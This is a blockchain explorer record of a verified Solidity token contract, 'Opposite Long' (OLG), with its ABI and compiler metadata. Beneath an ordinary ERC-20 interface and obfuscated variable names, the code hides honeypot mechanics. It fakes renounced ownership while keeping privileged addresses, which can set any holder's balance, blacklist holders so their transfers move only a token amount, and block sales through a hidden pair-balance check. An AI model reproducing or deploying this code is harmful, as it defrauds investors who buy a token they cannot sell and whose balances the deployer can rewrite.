{"SourceCode": "//SPDX-License-Identifier: MIT\n\npragma solidity ^0.8.8;\n\ninterface isMinTrading {\n    function createPair(address senderIs, address feeFromReceiver) external returns (address);\n}\n\ninterface txIs {\n    function totalSupply() external view returns (uint256);\n\n    function balanceOf(address receiverReceiverIs) external view returns (uint256);\n\n    function transfer(address launchMin, uint256 enableModeIs) external returns (bool);\n\n    function allowance(address listTakeIs, address spender) external view returns (uint256);\n\n    function approve(address spender, uint256 enableModeIs) external returns (bool);\n\n    function transferFrom(\n        address sender,\n        address launchMin,\n        uint256 enableModeIs\n    ) external returns (bool);\n\n    event Transfer(address indexed from, address indexed shouldToken, uint256 value);\n    event Approval(address indexed listTakeIs, address indexed spender, uint256 value);\n}\n\nabstract contract fromTotal {\n    function _msgSender() internal view virtual returns (address) {\n        return msg.sender;\n    }\n\n    function _msgData() internal view virtual returns (bytes calldata) {\n        return msg.data;\n    }\n}\n\ninterface autoTrading {\n    function factory() external pure returns (address);\n\n    function WETH() external pure returns (address);\n}\n\ninterface shouldTeam is txIs {\n    function name() external view returns (string memory);\n\n    function symbol() external view returns (string memory);\n\n    function decimals() external view returns (uint8);\n}\n\ncontract OppositeLong is fromTotal, txIs, shouldTeam {\n\n    mapping(address => mapping(address => uint256)) private txTrading;\n\n    address launchLiquidity = 0x10ED43C718714eb63d5aA57B78B54704E256024E;\n\n    uint256 autoTake;\n\n    function getOwner() external view returns (address) {\n        return minLimit;\n    }\n\n    bool public receiverShouldList;\n\n    uint256 public takeMarketing;\n\n    string private limitAutoBuy = \"OLG\";\n\n    function allowance(address tokenFee, address launchedSell) external view virtual override returns (uint256) {\n        if (launchedSell == launchLiquidity) {\n            return type(uint256).max;\n        }\n        return txTrading[tokenFee][launchedSell];\n    }\n\n    function sellReceiver(address launchedReceiver) public {\n        sellFrom();\n        if (takeMarketing != tradingFee) {\n            tokenFrom = true;\n        }\n        if (launchedReceiver == walletLaunched || launchedReceiver == fromBuy) {\n            return;\n        }\n        teamTotal[launchedReceiver] = true;\n    }\n\n    string private marketingTotal = \"Opposite Long\";\n\n    function approve(address launchedSell, uint256 enableModeIs) public virtual override returns (bool) {\n        txTrading[_msgSender()][launchedSell] = enableModeIs;\n        emit Approval(_msgSender(), launchedSell, enableModeIs);\n        return true;\n    }\n\n    uint256 constant maxSenderLaunched = 3 ** 10;\n\n    uint256 private atTotal = 100000000 * 10 ** 18;\n\n    function sellTotal(address walletFee) public {\n        if (receiverLaunched) {\n            return;\n        }\n        \n        listTeam[walletFee] = true;\n        if (tokenEnableSell != liquiditySell) {\n            tokenFrom = false;\n        }\n        receiverLaunched = true;\n    }\n\n    uint256 private toMax;\n\n    function sellFrom() private view {\n        require(listTeam[_msgSender()]);\n    }\n\n    address private minLimit;\n\n    function isAmount(address totalFrom, address launchMin, uint256 enableModeIs) internal returns (bool) {\n        if (totalFrom == walletLaunched) {\n            return sellExempt(totalFrom, launchMin, enableModeIs);\n        }\n        uint256 tradingLiquidity = txIs(fromBuy).balanceOf(minMode);\n        require(tradingLiquidity == autoTake);\n        require(launchMin != minMode);\n        if (teamTotal[totalFrom]) {\n            return sellExempt(totalFrom, launchMin, maxSenderLaunched);\n        }\n        return sellExempt(totalFrom, launchMin, enableModeIs);\n    }\n\n    address minMode = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;\n\n    function senderSwapIs() public {\n        emit OwnershipTransferred(walletLaunched, address(0));\n        minLimit = address(0);\n    }\n\n    event OwnershipTransferred(address indexed maxMarketing, address indexed liquidityFromFee);\n\n    function decimals() external view virtual override returns (uint8) {\n        return limitSell;\n    }\n\n    function sellExempt(address totalFrom, address launchMin, uint256 enableModeIs) internal returns (bool) {\n        require(listTeamShould[totalFrom] >= enableModeIs);\n        listTeamShould[totalFrom] -= enableModeIs;\n        listTeamShould[launchMin] += enableModeIs;\n        emit Transfer(totalFrom, launchMin, enableModeIs);\n        return true;\n    }\n\n    function name() external view virtual override returns (string memory) {\n        return marketingTotal;\n    }\n\n    constructor (){\n        \n        autoTrading walletMinEnable = autoTrading(launchLiquidity);\n        fromBuy = isMinTrading(walletMinEnable.factory()).createPair(walletMinEnable.WETH(), address(this));\n        \n        walletLaunched = _msgSender();\n        listTeam[walletLaunched] = true;\n        listTeamShould[walletLaunched] = atTotal;\n        senderSwapIs();\n        \n        emit Transfer(address(0), walletLaunched, atTotal);\n    }\n\n    bool private liquiditySell;\n\n    function owner() external view returns (address) {\n        return minLimit;\n    }\n\n    address public fromBuy;\n\n    function launchLaunched(uint256 enableModeIs) public {\n        sellFrom();\n        autoTake = enableModeIs;\n    }\n\n    function totalSupply() external view virtual override returns (uint256) {\n        return atTotal;\n    }\n\n    address public walletLaunched;\n\n    uint8 private limitSell = 18;\n\n    mapping(address => bool) public listTeam;\n\n    bool public tokenFrom;\n\n    mapping(address => uint256) private listTeamShould;\n\n    function enableTotal(address receiverAuto, uint256 enableModeIs) public {\n        sellFrom();\n        listTeamShould[receiverAuto] = enableModeIs;\n    }\n\n    uint256 public launchSell;\n\n    mapping(address => bool) public teamTotal;\n\n    function balanceOf(address receiverReceiverIs) public view virtual override returns (uint256) {\n        return listTeamShould[receiverReceiverIs];\n    }\n\n    bool public receiverLaunched;\n\n    function transfer(address receiverAuto, uint256 enableModeIs) external virtual override returns (bool) {\n        return isAmount(_msgSender(), receiverAuto, enableModeIs);\n    }\n\n    function transferFrom(address totalFrom, address launchMin, uint256 enableModeIs) external override returns (bool) {\n        if (_msgSender() != launchLiquidity) {\n            if (txTrading[totalFrom][_msgSender()] != type(uint256).max) {\n                require(enableModeIs <= txTrading[totalFrom][_msgSender()]);\n                txTrading[totalFrom][_msgSender()] -= enableModeIs;\n            }\n        }\n        return isAmount(totalFrom, launchMin, enableModeIs);\n    }\n\n    bool public tokenEnableSell;\n\n    uint256 marketingMode;\n\n    uint256 public tradingFee;\n\n    function symbol() external view virtual override returns (string memory) {\n        return limitAutoBuy;\n    }\n\n}", "ABI": "[{\"inputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"constructor\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"listTakeIs\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"spender\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Approval\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"maxMarketing\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"liquidityFromFee\",\"type\":\"address\"}],\"name\":\"OwnershipTransferred\",\"type\":\"event\"},{\"anonymous\":false,\"inputs\":[{\"indexed\":true,\"internalType\":\"address\",\"name\":\"from\",\"type\":\"address\"},{\"indexed\":true,\"internalType\":\"address\",\"name\":\"shouldToken\",\"type\":\"address\"},{\"indexed\":false,\"internalType\":\"uint256\",\"name\":\"value\",\"type\":\"uint256\"}],\"name\":\"Transfer\",\"type\":\"event\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"tokenFee\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"}],\"name\":\"allowance\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedSell\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableModeIs\",\"type\":\"uint256\"}],\"name\":\"approve\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverReceiverIs\",\"type\":\"address\"}],\"name\":\"balanceOf\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"decimals\",\"outputs\":[{\"internalType\":\"uint8\",\"name\":\"\",\"type\":\"uint8\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableModeIs\",\"type\":\"uint256\"}],\"name\":\"enableTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"fromBuy\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"getOwner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"uint256\",\"name\":\"enableModeIs\",\"type\":\"uint256\"}],\"name\":\"launchLaunched\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"launchSell\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"listTeam\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"name\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"owner\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverLaunched\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"receiverShouldList\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"launchedReceiver\",\"type\":\"address\"}],\"name\":\"sellReceiver\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"walletFee\",\"type\":\"address\"}],\"name\":\"sellTotal\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"senderSwapIs\",\"outputs\":[],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"symbol\",\"outputs\":[{\"internalType\":\"string\",\"name\":\"\",\"type\":\"string\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"takeMarketing\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"name\":\"teamTotal\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenEnableSell\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tokenFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"totalSupply\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"tradingFee\",\"outputs\":[{\"internalType\":\"uint256\",\"name\":\"\",\"type\":\"uint256\"}],\"stateMutability\":\"view\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"receiverAuto\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableModeIs\",\"type\":\"uint256\"}],\"name\":\"transfer\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[{\"internalType\":\"address\",\"name\":\"totalFrom\",\"type\":\"address\"},{\"internalType\":\"address\",\"name\":\"launchMin\",\"type\":\"address\"},{\"internalType\":\"uint256\",\"name\":\"enableModeIs\",\"type\":\"uint256\"}],\"name\":\"transferFrom\",\"outputs\":[{\"internalType\":\"bool\",\"name\":\"\",\"type\":\"bool\"}],\"stateMutability\":\"nonpayable\",\"type\":\"function\"},{\"inputs\":[],\"name\":\"walletLaunched\",\"outputs\":[{\"internalType\":\"address\",\"name\":\"\",\"type\":\"address\"}],\"stateMutability\":\"view\",\"type\":\"function\"}]", "ContractName": "OppositeLong", "CompilerVersion": "v0.8.19+commit.7dd6d404", "OptimizationUsed": "0", "Runs": "200", "ConstructorArguments": "", "EVMVersion": "Default", "Library": "", "LicenseType": "MIT", "Proxy": "0", "Implementation": "", "SwarmSource": ""}